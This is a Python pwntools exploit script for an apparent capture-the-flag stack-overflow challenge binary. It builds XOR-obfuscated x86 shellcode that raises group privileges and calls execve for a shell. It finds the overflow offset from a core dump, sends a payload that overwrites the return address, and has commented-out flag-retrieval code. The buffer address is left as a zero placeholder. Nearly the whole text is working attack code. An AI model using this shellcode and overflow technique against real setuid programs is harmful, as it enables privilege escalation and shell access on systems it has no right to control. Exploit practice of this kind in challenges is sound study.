from pwn import *
import os

DEBUG = True 

shellcode = asm('''
xor    eax,eax
xor    al,0x32
int    0x80
mov    ebx,eax
mov    ecx,eax
xor    eax,eax
xor    al,0x47
int    0x80
xor    ecx,ecx
xor    edx,edx
xor    eax,eax
xor    al,0xb
xor    ebx,ebx
push   ebx

mov    ebx, 0xc2d985c4
xor    ebx, 0xAAAAAAAA
push   ebx
mov    ebx, 0xac3c8585
xor    ebx, 0xAAAAAAAA
push   ebx

mov    ebx,esp
int    0x80
''') 

sled = asm('''
mov    eax, [0xffffd454]
mov    eax, [eax]
jmp    eax
''')

print(disasm(shellcode))

env = {}
file = './stack-ovfl-no-envp-no-argv-32'


# crash the process to get a core file and find the buffer address (still boilerplate)

io = process(file, env=env, setuid=False)
io.sendline(cyclic(10000)) 
io.wait()
core = io.corefile
buffer_address = 0x0000000
max_len = cyclic(10000).find(p32(core.fault_addr))
os.unlink(core.path) 

# launch the main process (still boilerplate)
if DEBUG:
    context.log_level = 'DEBUG'
    context.terminal = ['tmux', 'splitw', '-h']
    io = gdb.debug([file], env=env, gdbscript='''
b *main
continue
''')
else:
    io = process(executable=file, argv=[shellcode], env=env)

# END SETUP BOILERPLATE
# BEGIN CHALLENGE-SPECIFIC CODE


payload = sled + b"A" * (max_len - len(sled)) + p32(buffer_address)
io.send(payload)
io.interactive()

# END CHALLENGE-SPECIFIC CODE
# BEGIN FLAG RETRIEVAL BOILERPLATE

# import re
# io.sendlineafter(b'$', b'cat flag')
# flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
# print(flag)
